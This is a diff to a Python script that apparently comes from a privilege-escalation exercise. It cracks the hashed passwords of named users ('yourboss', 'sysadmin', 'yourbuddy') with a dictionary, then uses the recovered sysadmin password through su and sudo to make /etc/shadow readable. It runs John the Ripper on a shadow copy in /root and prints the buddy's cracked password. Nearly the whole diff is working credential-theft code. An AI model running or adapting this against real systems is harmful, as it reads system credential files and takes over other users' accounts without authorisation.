@@ -22,16 +22,22 @@ def getHahsedPW (userName, my_intput):
 
 bossName = "yourboss"
 sysAdminName = "sysadmin"
+bodyName ="yourbuddy"
 
 boss_password = getHahsedPW(bossName,my_input)
 sys_admin_password = getHahsedPW(sysAdminName,my_input)
-your_buddy_password = getHahsedPW("yourbuddy",my_input)
+your_buddy_password = getHahsedPW(bodyName,my_input)
 
-#print(findWord(my_dict.split(),boss_password))
-#print(findWord(my_dict.split(),sys_admin_password))
+print(findWord(my_dict.split(),boss_password))
+print(findWord(my_dict.split(),sys_admin_password))
 
 temp = f"su {sysAdminName} -c \"echo {sys_admin_password} | sudo -S chmod 640 /etc/shadow\""
 subprocess.run(temp, stdout = subprocess.PIPE, universal_newlines = True, input = sys_admin_password , stderr=subprocess.STDOUT, shell = True)
 
-
-
+subprocess.run("john --wordlist=/usr/share/john/password.lst /root/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
+myOutPut = (subprocess.run("john --show /root/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True))
+splited = (str(myOutPut).split(":"))
+for x in range(len(splited)):
+	if bodyName in splited[x]:
+		print(splited[x+1])
+		break
